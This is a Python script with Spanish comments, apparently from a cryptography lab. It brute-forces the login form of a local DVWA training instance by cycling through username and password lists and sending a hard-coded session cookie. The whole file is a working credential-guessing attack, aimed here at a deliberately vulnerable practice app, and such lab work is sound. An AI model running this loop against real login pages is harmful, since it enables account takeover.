import requests

# --- Configuración ---
URL = "http://localhost:4280/vulnerabilities/brute/"
usuarios_file = "/home/kuttyxo-linux/Lab2_cripto/users.txt"  # Cambié la ruta al archivo de usuarios
passwords_file = "/home/kuttyxo-linux/Lab2_cripto/claves.txt"  # Cambié la ruta al archivo de contraseñas
SUCCESS_TEXT = "Welcome to the password protected area"  # Mensaje de éxito de DVWA

# --- Cabecera HTTP Clave ---
# Para que DVWA nos deje atacar, necesitamos mantener una sesión válida.
# Inicia sesión en DVWA en Firefox.
# Abre las herramientas de desarrollador (F12) -> Red.
# Haz clic en cualquier petición a localhost.
# En la sección "Cabeceras de la solicitud", busca la línea "Cookie" y copia su valor.
# Pega el valor completo aquí abajo.
COOKIE = {
    "security": "low",
    "PHPSESSID": "8d5c5a06896558c877a302e4a69b6971"  # ¡IMPORTANTE! Este es el valor correcto de la cookie PHPSESSID
}

# --- Lógica del Ataque ---
def main():
    print("[-] Iniciando ataque de fuerza bruta...")

    # Abrimos los archivos de usuarios y contraseñas
    with open(usuarios_file) as u:
        usuarios = u.read().splitlines()

    with open(passwords_file) as p:
        passwords = p.read().splitlines()

    # Iteramos sobre los usuarios y las contraseñas
    for usuario in usuarios:
        for password in passwords:
            print(f"[.] Probando: {usuario}:{password}")

            # Preparamos los datos que enviaremos
            params = {
                "username": usuario,
                "password": password,
                "Login": "Login"
            }

            # Hacemos la petición GET con los parámetros y la cookie de sesión
            response = requests.get(URL, params=params, cookies=COOKIE)

            # Verificamos si la respuesta contiene el texto de éxito
            if SUCCESS_TEXT in response.text:
                print(f"[+] ¡ÉXITO! Credenciales encontradas: {usuario}:{password}")
                return  # Salir del ataque cuando se encuentre la combinación correcta

    print("[-] Ataque finalizado.")

# Ejecutar el script
if __name__ == "__main__":
    main()
